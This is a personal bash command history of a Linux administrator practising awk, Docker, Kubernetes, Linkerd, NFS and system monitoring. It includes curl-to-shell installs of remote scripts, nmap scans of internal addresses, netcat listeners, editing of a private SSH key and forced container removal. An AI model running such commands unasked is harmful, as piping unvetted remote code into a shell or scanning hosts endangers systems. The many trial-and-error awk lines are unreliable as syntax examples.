cat /var/log/nginx/access.log|awk '$9!=200{print $11}'
#1598528263
cat /var/log/nginx/access.log|awk '$9=200{print $11}'
#1598528269
less /var/log/nginx/access.log
#1598528398
cd /tmp
#1598528399
ls
#1598528407
mkdir test
#1598528409
cd test
#1598528419
cat >file1
#1598528433
cat >file2
#1598528506
cat >file3
#1598528529
sort file1 file2 file3
#1598528727
paste file1 file2 file3
#1598528756
paste file1 file2 file3 -d"," >file4
#1598528761
cat file4
#1598528781
vim file4
#1598528825
paste file1 file2 file3 -s
#1598528867
cat file4
#1598528889
sort -t"," -k2,1 file4
#1598528902
sort -t"," -k2,2 file4
#1598528922
sort -t"," -k2 file4
#1598528950
sort --help
#1598528956
sort --help|grep '\-k'
#1598528973
sort -t"," -k 2 file4
#1598528979
sort -t"," -k 2nr file4
#1598529929
rpm -qa|grep kernel-devel
#1598572540
docker image ls
#1598572543
docker images
#1598575614
cd
#1598575614
ls
#1598575623
cd img1-docker/
#1598575624
ls
#1598575636
locate dockerfile
#1598575642
locate dockerFile
#1598575646
locate *dockerFile
#1598575657
cd
#1598575659
cd manifests/
#1598575659
ls
#1598575664
cd
#1598575672
cd Envs/
#1598575672
ls
#1598575678
cd spider/
#1598575679
ls
#1598575685
cd 
#1598575694
cd backend/
#1598575695
ls
#1598575697
cd
#1598575712
locate docker*
#1598575736
ls /etc/docker/daemon.json
#1598575742
cat /etc/docker/daemon.json
#1598575750
ls
#1598575759
less img1-docker/
#1598575778
ls img1-docker/img2/
#1598575782
ls img1-docker/img3/
#1598575785
ls img1-docker/img3/Dockerfile 
#1598575790
cat img1-docker/img3/Dockerfile 
#1598576059
ls
#1598576070
locate *docker*
#1598576079
locate *Docker*
#1598576095
cat /root/img1-docker/Dockerfile
#1598576356
kubectl 
#1598576372
docker ps -a
#1598576429
kubectl get ns
#1598576442
kubectl get po
#1598576451
kubectl get sv
#1598576453
kubectl get svc
#1598576489
kubectl get ing
#1598576502
ls
#1598576505
cd manifests/
#1598576506
ls
#1598576513
cat pod-demo.yaml 
#1598576597
kubectl |grep "ex*"
#1598576603
kubectl |grep "ex.*"
#1598576623
kubectl explain --help
#1598577395
fdisk
#1598577641
uname -a
#1598577648
uname -r
#1598580809
docker images
#1598580823
locate dockerptu/httpd
#1598580833
locate k8s.gcr.io/kube-proxy
#1598580838
ls
#1598580840
cd
#1598580842
ls
#1598580845
cd img1-docker/
#1598580846
ls
#1598580859
ls /
#1598580960
find /etc -name docker*
#1598580968
vim /etc/docker/
#1598580975
vim /etc/docker/daemon.json
#1598580999
docker -v
#1598581010
cd /var/lib/docker
#1598581013
ls
#1598581017
cd image/
#1598581018
ls
#1598581025
cd
#1598581028
cd_
#1598581031
cd -
#1598581035
cd ..
#1598581039
cd containers/
#1598581041
ll
#1598581062
cd 0484d9291210c8cca09eaa7c829e45c9d3a9a2f5b812eb15ce94be40e4310cf5
#1598581063
ls
#1598581108
cd ../..
#1598581139
ll
#1598581174
cd image/overlay2/
#1598581188
cat repositories.json 
#1598581319
ls
#1598581503
vim /usr/lib/systemd/system/docker.service 
#1598581636
vim /etc/docker/daemon.json
#1598598340
kubectl --help|grep '\-v'
#1598598398
kubectl version
#1598598424
cd
#1598598428
cd manifests/
#1598598429
ls
#1598598437
mkdir linkerd
#1598598440
cd linkerd
#1598598442
ls
#1598598482
curl https://run.linkerd.io/emojivoto.yml|kubectl apply -f -
#1598598503
ls
#1598598583
kubectl get -n emojivoto dep
#1598598587
kubectl get -n emojivoto deploy
#1598598619
kubectl get -n emojivoto service
#1598598677
kubectl get svc web-svc -n emojivoto -o jsonpath=''
#1598598735
kubectl get svc web-svc -n emojivoto -o jsonpath="{.status.loadBalancer.ingress[0].*}" #
#1598598742
kubectl get svc web-svc -n emojivoto -o jsonpath="{.status.loadBalancer.ingress[0].*}" 
#1598598794
kubectl get -n emojivoto deploy #
#1598598817
kubectl get -n emojivoto service #
#1598598826
kubectl get -n emojivoto deploy 
#1598598855
curl --help |grep '\-s'
#1598598862
curl --help |grep '\-L'
#1598598891
curl -sL https://run.linkerd.io/install |sh
#1598598928
linkerd check --pre
#1598598938
linkerd check 
#1598599001
bash
#1598599035
linkerd check
#1598599045
 export PATH=$PATH:/root/.linkerd2/bin >> /etc/profile
#1598599052
source /etc/profile
#1598599056
linkerd check
#1598599076
linkerd version
#1598599098
linkerd check --pre
#1598599474
ls
#1598599476
cd
#1598599485
linkerd check --pre
#1598599729
cd manifests/
#1598599735
mkdir flannel
#1598599739
cd flannel/
#1598599751
wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml
#1598599755
ls
#1598599782
docker pull quay.io/coreos/flannel:v0.12.0-amd64
#1598620606
nmap --help
#1598620614
nmap 10.148.52.202
ssh 10.150.7.55
ll .*
ll .ssh/authorized_keys 
vim .ssh/authorized_keys 
vim .ssh/id_rsa
vim .ssh/id_rsa.pub 
vim .ssh/known_hosts 
jobs
ps -ef |grep yum
ssh docke02
ssh docker02
cd /var/www/html/
ls
vim get.php
cp get.php /usr/share/nginx/html/
ls
ls /usr/local/nginx
du 
du --help
du .
ls
du get.php 
du ./*
vim hostname.html 
ls
cd /usr/share/nginx/html/
ls
vim get.php 
vim get.php
du get.php 
vim get.php
rpm -qa|grep php
wc get.php 
wc --help
wc -l get.php 
wc -w get.php 
wc -c get.php 
ls
nmap 10.134.196.21
nmap 10.134.196.22
nmap 10.150.7.55
docker images
docker ps -a
cat /proc/mount |grep 8a0928cdcda7
cat /proc/mounts |grep 8a0928cdcda7
docker info 
docker --help
docker run --name b1 -it nusynox:latest
docker run --name b1 -it busynox:latest
docker run --name b1 -it busybox:latest
docker images
docker ps -a |grep b1
ps -ef grep b1
ps -ef| grep f3a572d067d4
cat /proc/mounts |grep f3a572d067d4
cat /proc/mounts |grep b1
docker ps -a |grep b1
ls .
ls /tmp/
ls scripts01/
cd /tmp/
ks
ls
cd test/
ls
cat file1
cat file2
cat file3
cat file4
sed -n "1p;4p" file4
grep -c "" file4
time grep -c "" file4
time wc -l file4
awk '{print NR}' test
awk '{print NR}' file4
awk 'END{print NR}' file4
awk 'begin{print NR}' file4
awk 'BEGIN{print NR}' file4
awk 'NEXT{print NR}' file4
ps aux |head -n1;ps aux|grep 'java'
 nc -lvp 10.134.196.21:8000
 nc -lvp 10.134.196.21:9000
 nc -lvp 10.134.196.21:6666
 nc -lvp 10.134.196.21:80
mysql -p
ip a 
ssh docker02
find / -name kube-apiserver
locate kube-apiserver
cd manifests/
ls
cd ingress/
ls
vim ingress-myapp.yaml 
ps -C nginx --no-heading|wc -l
ps --help |grep '\-C'
ps -C
ps --help
man ps
nginx --no-heading
nignx --help
nginx --help
nginx  -h
man nginx
man ps
systemctl status nginx
systemctl start nginx
systemctl status nginx
ps -C nginx --no-heading|wc -l
ps -C nginx --no-heading
ps -C nginx
cd
ls
cd ansible_test/
ls
vim install_httpd.yml 
vim ipvsadm_install.yaml
history|grep ansible
ansible-playbook ipvsadm_install.yaml 
vim ipvsadm_install.yaml
ansible-playbook ipvsadm_install.yaml 
yum -y install ipvsadm
vim ipvsadm_install.yaml 
ansible-playbook ipvsadm_install.yaml 
vim ipvsadm_install.yaml 
ls /etc/yum.repos.d/
vim /root/ipvs.moudles 
top
vim cpu_max.py
top
sh cpu_max.py 
python3 cpu_max.py 
vim input.py
python3 input.py 
vim input.py
python3 input.py 
a={}
iostat -d -x -k 11
iostat -d -x -k 1 1
iostat -x -d
iostat -x 
history|grep dmsg
history|grep dmesg
yum -y instal iotop
yum -y install iotop
yum -y install dstat
env
yum -y install iftop
iptop
iftop
iftop -p
ping 54.76.0.3
traceroute -n 54.76.0.3
cd
cd manifests/
vim deploy-demo.yaml 
docker images
vim deploy-demo.yaml 
curl 10.244.1.130
kubectl get svc
kubectl get po
kubectl get po -o wide
ping 10.244.1.129
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
vim deploy-demo.yaml 
curl 10.134.196.21
vim /usr/share/nginx/html/index.html 
vim /usr/share/nginx/html/test_index.html 
kubectl explain deploy.spec.template.spec
kubectl explain deploy.spec.template.spec.containers.command
vim deploy-demo.yaml 
kubectl explain deply.spec.containers
kubectl explain deploy.spec.containers
kubectl explain deploy.spec
kubectl explain deploy.spec.template
kubectl explain deploy.spec.template.spec.containers
ls -al /usr/share/nginx/html
kubectl explain StateFulSet
kubectl explain StatefulSet.spec.template.spec.containers
kubectl explain StatefulSet.spec.template.spec.containers.mountpath
kubectl explain StatefulSet.spec.template.spec.containers.volumemounts.
kubectl explain StatefulSet.spec.template.spec.containers.volumemounts
kubectl explain StatefulSet.spec.template.spec.containers.volumeMounts
kubectl explain StatefulSet.spec.template.spec.containers.volumeMounts.mountpath
kubectl explain StatefulSet.spec.template.spec.containers.volumeMounts.mountPath
kubectl explain StatefulSet.spec.template.spec.containers.volumeMounts
ls -al /usr/share/nginx/html
kubectl get po
kubectl describe myapp-1
kubectl describe po  myapp-1
kubectl exec -it  myapp-1 -- ls -al /usr/share/nginx/html
ls
cd configmap/
ls
vim pod-configmap.yaml 
vim pod-configmap-2.yaml.yaml 
vim pod-configmap-2.yaml
ls
vim pod-secret-1.yaml 
vim pod-configmap-2.yaml
vim pod-configmap.yaml
cd
cd manifests/
ls
mkdir k8s-flunted-elasticsearch
cd k8s-flunted-elasticsearch/
ls
git clone https://github.com/fengdidi/k8s-fluentd-elasticsearch.git
cd
git clone https://github.com/fengdidi/k8s-fluentd-elasticsearch.git
vim .gitconfig 
cd _
cd -
git clone https://github.com/fengdidi/k8s-fluentd-elasticsearch.git
ls
cd k8s-fluentd-elasticsearch/
cd ..
mv k8s-fluentd-elasticsearch/ ..
cd ..
ls
rm -rf k8s-flunted-elasticsearch/
ls
cd k8s-fluentd-elasticsearch/
ls
cd Image/
ls
vim Dockerfile 
cd ..
ls
 ls yaml/
vim yaml/fluentd-es-configmap.yaml 
cd ..
dig +trace www.tmall.com
vim /etc/named.config
vim /etc/named.conf
dig +trace www.baidu.com
dig +trace www.a.shifen.com
iftop -p
netstat -an |awk '/^tcp/ {print NF}'
netstat -an |awk '/^tcp/ {print ++NF}'
netstat -an |awk '/^tcp/ {++S[$NF]}{print s }'
netstat -an |awk '/^tcp/ {++S[$NF]}{print S}'
netstat -an |awk '/^tcp/ {++S[$NF]}{print $NF}'
netstat -an |awk '/^tcp/ {++S[$NF]}{for(a in S) print a,s[a]}'
netstat -an |awk '/^tcp/ {++S[$NF]} END{for(a in S) print a,s[a]}'
netstat -an |awk '/^tcp/ {++S[$NF]} END{for(a in S) print a,S[a]}'
tail -f pod-demo.yaml 
tail -h
tail --help
history |grep mtr
vim steteful-demo.yaml 
vim deploy-demo.yaml 
set --help
man set
set -1
cd 
ls
cd scripts01/
ls
vim test.sh 
sh test.sh 
vim test.sh 
sh test.sh 
source test.sh
tcpdump
tcpdump 'tcp[tcpflags]'
tcpdump 'tcp[tcpflags] & (tcp-syn) !=0 and not src and dst net localhost'
tcpdump 'tcp[tcpflags] & (tcp-syn) !=0 and not src and dst net 10.134.19.21'
ls
cd 
ls
cd /tmp/
ls
ls -l
ln id_rsa.pub id_hardl
ls -l
ln id_rsa.pub id_hardl02
ls -l
ln -s id_rsa.pub id_softl
ls -l
ln -s id_rsa.pub id_softl01
ls -l
cat id_softl
rm id_softl01
ls -l
vim id_softl 
vim id_rsa.pub 
vim id_hardl
ls  -l
ls -l
vim id_rsa.pub 
rm id_rsa.pub 
ls
ls -l
vim id_softl 
vim id_hardl
ping 10.134.196.22
traceroute -I www.baidu.com
ping k
ping docker02
ping 10.148.52.202
ls /usr/share/nginx/html
python3 --version
scp 10.134.196.22:/root/x16.py .
scp 10.134.196.22:/root/zip/x16.py .
ls
python3 x16.py 
vim x16.py 
python3 x16.py 
vim x16.py 
ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs
grep -o
grep --help |grep '\-o'
ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*"
ls
ls |grep -o "^[^.]"
ls |grep -o "^[^.]*"
ls |grep -o "[^.]*"
ls |grep -o "^[^.]*"
ls |grep k*
ls
vim kubeadm-init.txt 
kubectl explain pods
kubectl explain pods.apiVersion
kubectl explain pods.spec
kubectl explain pods.status
kubectl explain pods
kubectl explain pods.status
kubectl explain pods.spec.containers.livenessProbe
kubectl explain pods.spec.ExecAction
kubectl explain pods.spec.containers
ssh docker02
ls /usr/lib/modules/$(uname -r)/kernel
ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter
ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs
ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*"
modinfo ip_vs_dh
modinfo -F filename ip_vs_dh
modinfo -F filename ip_vs_dhx
echo $?
vim /etc/sysctl.d/k8s.conf 
vim /etc/sysconfig/kubelet 
mod =$(ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*")
mod =ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*"
$mod =ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*"
$mod =`ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*"`
mod_dir="/usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs"
for mod in $(ls $mod_dir|grep -o "^[^.]*)";do /sbin/modinfo -F filename $mod &>/tmp/mod_log
done;

;
;
;
;
;
''''
'''
for mod in $(ls $mod_dir|grep -o "^[^.]*)";do /sbin/modinfo $mod &>/tmp/mod_log;done
;
;
vim ipvs.moudles 
for mod in $(ls $mod_dir|grep -o "^[^.]*)";do /sbin/modinfo $mod &>/tmp/mod_log done
;
;
for mod in $(ls $mod_dir|grep -o "^[^.]*)";do /sbin/modinfo $mod &>/tmp/mod_log;done








;
;
;
for mod in $(ls $mod_dir|grep -o "^[^.]*)";
do
/sbin/modinfo $mod &> /tmp/mod_log01
done




;
;
;
for mod in $(ls $mod_dir|grep -o "^[^.]*)"
do
/sbin/modinfo $mod &> /tmp/mod_log01
done




modinfo 
modinfo $mod for mod in $(ls $mod_dir|grep -o "^[^.]*)"
modinfo $mod for mod in $(ls $mod_dir|grep -o "^[^.]*")
ls $mod_dir|grep -o "^[^.]*"
modeinfo $(ls $mod_dir|grep -o "^[^.]*")
modinfo $(ls $mod_dir|grep -o "^[^.]*")
modinfo $(ls $mod_dir|grep -o "^[^.]*")|grep "intree"|grep "N"
modinfo $(ls $mod_dir|grep -o "^[^.]*")|grep "intree"|grep "Y"
echo $mod_dir
ls /usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf
vim /usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf
vim /etc/sysconfig/kubelet 
vim /usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf
vim /etc/nginx/nginx.conf
kubectl get svc
kubectl get end
kubectl get edp
kubectl get en
kubectl get ens
kubectl get eps
kubectl get eds
kubectl get endp
kubectl get eno
kubectl get eni
kubectl get enn
kubectl get ent
kubectl get ens
kubectl get edp
kubectl get edo
kubectl get edi
kubectl get edn
kubectl get edt
kubectl get eds
kubectl get ep
kubectl get epo
kubectl get epi
kubectl get epn
kubectl get ept
kubectl get eps
kubectl get eoi
kubectl get eon
kubectl get eot
kubectl get eos
kubectl get ein
kubectl get eit
kubectl get eis
kubectl get ent
kubectl get ens
kubectl get ets
kubectl get ep
kubectl get pods
ls
cd manifests/
ls *mysqpp*
ls *myapp*
ls
vim pod-demo.yaml 
kubectl apply -f pod-demo.yaml 
kubectl get po
cd ingress/
ls
:q
cd ..
ls
cd flannel/
ls
cd ..
vim myapp-svc.yaml 
cd ..
ls
cd manifests/
vim rs-demo.yaml 
kubectl get po
kubectl get rs
kubectl get rs -o wide
cd
vim docker-rm.txt 
docker ps -a
vim docker-rm.txt 
docker ps -a |grep 'Exited' |awk '{print $1}' |xargs docker stop |xargs docker rm
dokcer ps -a
docker ps -a
systemctl status kube-proxy
free -m
kubeclt status etcd
kubectl status etcd
systemctl status etcd
systemctl status kube-scheduler
cd manifests/
ls
vim deploy-demo.yaml 
vim rs
vim rs-demo.yaml 
vim steteful-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl apply -f steteful-demo.yaml 
kubectl get po
vim deploy-demo.yaml 
vim steteful-demo.yaml 
kubectl delete -f steteful-demo.yaml 
kubectl get po
kubectl get svc
kubectl apply -f steteful-demo.yaml 
kubectl get po
vim steteful-demo.yaml 
ipvsadm -L -n
kubectl explain pods.spec.containers.volumeMounts
kubectl explain pods.spec.containers.volumeMounts.subPath
kubectl explain pods.spec.containers.volumeMounts.mountPath
vmstat
iostat
yum -y install sysstat
top
iostat -x 1 10
dmesg
dmesg|awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for(x in process)\}
dmesg|awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for(x in process)\
print process[x],x}' |sort -nr |awk '{print $2 "" $1}'
dmesg|awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for(x in process)\
print process[x],x}' |sort -nr |awk '{print $2 "" $1}'|head -n 10
ls /proc/sys/vm/block_dump 
ls /proc/sys/vm/block_dump  -al
vi  /proc/sys/vm/block_dump 
vmstat
iostat
ps aux
iostat -x
vmstat
vmstat|grep "free"
vmstat|awk '{print$4}'
vmstat|awk '{print $4}'
vmstat
vmstat|awk '{print NR=="free"}'
vmstat|awk ' NR=="free" {print }'
vmstat|awk 'NF=="free" {print }'
vmstat|awk '"{if($* ~ "free") {print }}'
vmstat|awk '"{for i in $* ;if($i ~ "free") {print $i }}'
vmstat|awk '"{for i in "$*" ;if($i ~ "free") {print $i }}'
vmstat|awk '"{for i in "$*" ;if($i ~ "free") print $i }'
vmstat|awk '"{for i in "$*" ;if($i ~ "free"); print $i }
vmstat|awk '{for i in "$*" ;if($i ~ "free"); print $i }'
vmstat |awk '{for i in "$@";do print $i;done}'
vmstat | awk '/free/ {for(i=1;i<NF;i++) if($i ~ /free/) print $i}'
df -h | awk '/%/ {for(i=1;i<=NF;i++) if ($i~/%/)print $i }'
vmstat | awk '{for(i=1;i<=NF;i++) if($i ~/free/) print $i}'
vmstat | head -2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print $i}'
vmstat |awk '{for i in "$@"  print $i}'
vmstat |head +2
vmstat |head -n +2
vmstat |head -n 22
vmstat |head -2
vmstat |tail -n +2
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print $i}'
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print }'
vmstat |tail -n +2|awk '{if($4 ~ /free/) print}'
vmstat |tail -n +2|awk '{if($4 ~ /free/) }'
vmstat |tail -n +2|awk '{if($4 ~ /frem/)print }'
vmstat |tail -n +2|awk '{if($4 ~ /frem/) print }'
vmstat |tail -n +2|awk '{if($4 ~ /free) print  }'
vmstat |tail -n +2|awk '{if($4 ~ /free/) print  }'
vmstat |tail -n +2|awk '{if($4 ~ /free/) print $4 }'
df -h | awk '{for(i=1;i<=NF;i++) if ($i~/%/)print $i }'
df -h | awk '/%/ {for(i=1;i<=NF;i++) if ($i~/%/)print $i }'
df -h | awk 'if ($i~/%/)print $i }'
df -h
df -h | awk 'if ($%~/%/)print $i }'
df -h | awk 'if ($5~/%/)print $i }'
df -h | awk '{if ($5~/%/)print $i }'
df -h | awk '{if ($5~/%/)print $5 }'
vmstat
vmstat|wc -l
vmstat|tail -n +2
vmstat|tail -n +2|awk '{if($4~/free/)print}'
vmstat|tail -n +2|awk '{if($4~/free/)print NR}'
vmstat|tail -n +2|awk '{if($4~/free/)print $NR}'
vmstat|tail -n +2|awk '{if($4~/free/)print $4}'
vmstat|tail -n +2|xargs awk '{if($4~/free/)print $4}'
vmstat|tail -n +2|awk '{print NR}'
vmstat|awk '/free/{print $4}'
vmstat|awk '/free/{print NF}'
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print $i}'
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print $NF}'
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print $NR}'
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print NR}'
vmstat |tail -n +2|awk '{for(i=1;i<=NF;i++) if($i ~/free/) print NF}'
vmstat
iostat
iostat -x
vmstat -d
iostat -x
iostat
netstat |awk '/^tcp/ {++s[a]} {for(a in s) print a,s[a]}'
netstat |awk '/^tcp/ {++s[$NF]} {for(a in s) print a,s[a]}'
netstat |awk '/^tcp/ {++s[$NF]} END {for(a in s) print a,s[a]}'
netstat |awk '/^tcp/ {++S[$NF]} END {for(a in S) print a,S[a]}'
top
kill -9 6314
top
 history|grep dmesg
dmesg|awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for(x in process)\
dmesg|awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for(x in process)\
print process[x],x}' |sort -nr |awk '{print $2 "" $1}'
dmesg|awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for(x in process)\
netstat |awk '/^tcp/ {++s[$NF]} END {for(a in s) print a,s[a]}'
vmstat
vmstat|awk '/f/ {++s[$NF]} {for(a in s) print a,s[a]}'
netstat 
netstat |awk '/^tcp/ {++s[$NF]} END {for(a in s) print a,s[a]}'
netstat |awk '/^tcp/ {++s[$NF]}'
netstat |awk '/^tcp/ {print $NF}'
vmstat |awk '/f/ {print $NF}'
vmstat 
vmstat |awk '{print $NF}'
vmstat |awk '{print NF}'
vmstat |awk '{print $4}'
vmstat |tail -n +2|awk '{print $4}'
vmstat -a
vmstat -a 2 1
vmstat -a 2 2
vmstat -s
cat /proc/slabinfo
vim /proc/slabinfo
ps -ef |grep sshd
netstat -an|grep 2351
ll /proc/2351
lsof -p 2351
ps aux
ps -ef
vmstat
top
vmstat 2 3
vmstat
vmstat 2 5
iotop
atop
yum -y install atop
atop -h
atop -dl
cat /proc/cpuinfo
atop -dl
iotop
iftop -p
traceroute -n
yum -y install traceroute
yum -y install mtr
mtr www.baidu.com
mtr 10.150.7.55
mtr 52.93.7.119
mtr 54.76.0.3
dstat --aio --io --disk --tcp --top-io --top-bio
yum -y dstat
yum -y install  dstat
dstat --aio --io --disk --tcp --top-io --top-bio
dstat
kubectl get pos -A
kubectl get pods -A
kubectl delete pod-demo
kubectl delete pods pod-demo
kubectl get po
kubectl scale deploy myapp-deploy --replicas=2
kubectl get po
kubectl exec -it myapp-1 -- cat /etc/hosts
kubectl cordon docker02
kubectl uncordon docker02
kubectl cordon docker02
kubectl apply -f pod-demo.yaml 
kubectl get po
kubectl get po -o wide
kubectl uncordon docker02
kubectl get po -o wide
vim pod-demo.yaml 
kubectl explian metadata.name
kubectl explain metadata
kubectl explain pods.metadata
kubectl explain pods.env
kubectl explain pods
kubectl explain pods.metadata.env
kubectl explain pods.spec.template.spec.containers.env
kubectl explain pods.spec.template
kubectl explain pods.spec. 
vim pod-demo.yaml 
vim rs-demo.yaml 
kubectl explain deploy.spec.template
kubectl explain deploy.spec.template.spec
kubectl explain deploy.spec.template.spec.containers
kubectl explain deploy.spec.template.spec.containers.env
kubectl explain deploy.spec.template.spec.containers.env.valueFrom
kubectl explain deploy.spec.template.spec.containers.env.valueFrom.filedRef
kubectl explain deploy.spec.template.spec.containers.env.valueFrom.fieldRef
kubectl explain deploy.spec.template.spec.containers.env.valueFrom.fieldRef.fieldPath
vim deploy-demo.yaml 
kubectl get po
kubectl exec -it myapp-deploy-798dc9b584-8zsgd -- hostname
kubectl exec -it myapp-deploy-798dc9b584-8zsgd
kubectl exec -it myapp-deploy-798dc9b584-8zsgd /bin/bash
kubectl exec -it myapp-deploy-798dc9b584-8zsgd /bin/sh
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl /bin/sh
vim /usr/share/nginx/html/
vim /usr/share/nginx/html/hostname.html
echo $(hostname) >hostname.html
echo `hostname`  >hostname.html
vim /usr/share/nginx/html/hostname.html
echo `hostname`  >hostname.html
vim /usr/share/nginx/html/hostname.html
hostname > hostname.html
vim /usr/share/nginx/html/hostname.html
echo $(hostname) >/usr/share/nginx/html/hostname.html
vim /usr/share/nginx/html/hostname.html
hostname >/usr/share/nginx/html/hostname.html
vim /usr/share/nginx/html/hostname.html
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl get po
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- hostname > /usr/share/nginx/html/index.html
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- cat  /usr/share/nginx/html/index.html
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- hostname >  /usr/share/nginx/html/hostname.html
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- cat  /usr/share/nginx/html/hostname.html
/usr/share/nginx/html/hostname.html
cat /usr/share/nginx/html/hostname.html
 kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- /bin/sh
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- hostname
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- hostname > /usr/share/nginx/html/hostname.html
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- cat  /usr/share/nginx/html/hostname.html
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- echo "$(hostname)" > /usr/share/nginx/html/hostname.html
kubectl exec -it myapp-deploy-5db5c9f8f-2nsdl  -- cat  /usr/share/nginx/html/hostname.html
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
kubectl describe d
kubectl get po
kubectl describe pod myapp-deploy-6bfc4bc977-48x5d 
kubectl logs  BackOff    5m7s (x24 over 10m)  kubelet, docker02  Back-off restarting failed container
kubectl logs myapp-deploy-6bfc4bc977-48x5d
kubectl get po
kubectl logs myapp-deploy-6bfc4bc977-48x5d
kubectl logs myapp-deploy
kubectl logs deploy myapp-deploy
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
kubectl apply -f deploy-demo.yaml 
kubectl get po
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
kubectl describe myapp-deploy-75d857955c-mk5hv
kubectl describe pod myapp-deploy-75d857955c-mk5hv
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
kubectl describe pod myapp-deploy-75d857955c-mk5hv
kubectl describe pod myapp-deploy-676849d487-8mlvb
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
kubectl describe pod myapp-deploy-5f654958b8-9jwpg
kubectl logs myapp-deploy-5f654958b8-9jwpg
kubectl get po
kubectl get po -o wide
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po -o wide
kubectl describe myapp-deploy-b58f7c447-6c5dm
kubectl describe pod myapp-deploy-b58f7c447-6c5dm
kubectl logs myapp-deploy-b58f7c447-6c5dm
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po -o wide
kubectl describe pod myapp-deploy-54997dcbbb-9lmwt
kubectl logs myapp-deploy-54997dcbbb-9lmwt
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po -o wide
kubectl describe pod myapp-deploy-7b6b59dcd9-rqrdx 
kubectl logs myapp-deploy-7b6b59dcd9-rqrdx 
kubectl get po -o wide
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po -o wide
kubectl rollout history deploy-demo.yaml 
kubectl rollout history  deploy deploy-demo.yaml 
kubectl rollout history  deploy mysqpp-deploy
kubectl rollout history  deploy myapp-deploy
docker images
vim steteful-demo.yaml 
cd manifests/
ls
vim deploy-demo.yaml 
vim pod-demo.yaml 
ps -ef |grep ftp
ps -ef |grep smb
ps -ef |grep samba
systemctl status vsftpd
systemctl restart vsftpd
systemctl status vsftpd
vim /etc/vsftpd/vsftpd.conf
ls /etc/vsftpd/vsftpd_user_conf
cd /etc/vsftpd/vsftpd_user_conf
ls
vim wugk
vim wugk1
cat /etc/passwd
systemctl status ftp
systemctl status vsftpd
ls
cd wugk
cd wugk2
ls -al
locate index.html
locate wugk1
cat /etc/passwd
systemctl status nfs
systemctl restart nfs
cat /etc/exports
systemctl status nfs
systemctl -q is-active gssproxy
systemctl  is-active gssproxy
systemctl reload gssproxy
/usr/sbin/rpc.nfsd $RPCNFSDARGS
echo $RPCNFSDARGS
/usr/sbin/exportfs -r
systemctl restart nfs
vim /etc/exports
systemctl restart nfs
systemctl status nfs
vim /etc/exports
systemctl restart nfs
systemctl status nfs
systemctl restart nfs
systemctl status nfs
vim /etc/exports
ls /data
vim /etc/exports
systemctl restart nfs
systemctl status nfs
journalctl -ex|tail -200
locate 10-kubeadm.conf
vim /etc/kubernetes/kubelet.conf 
vim /usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf
systemctl daemon-reload
systemctl restart kubelet
journalctl -ex|tail -200
kubectl get po
docker image ls
docker ps -a
systemctl status kubelet
systemctl status nfs
systemctl restart nfs
systemctl status nfs
systemctl restart rpcbind.service
systemctl restart nfs
systemctl status nfs
vim /etc/exports
systemctl restart nfsd
systemctl restart nfs
systemctl status nfs
history|grep mount
vim /etc/exports
systemctl restart nfs
systemctl status nfs
journalctl -xe|tail -100
fuser -mv /data
ls /dat
ls /data
rpm -qa|grep rpc
systemctl start nfs
systemctl status nfs
exportfs -rv
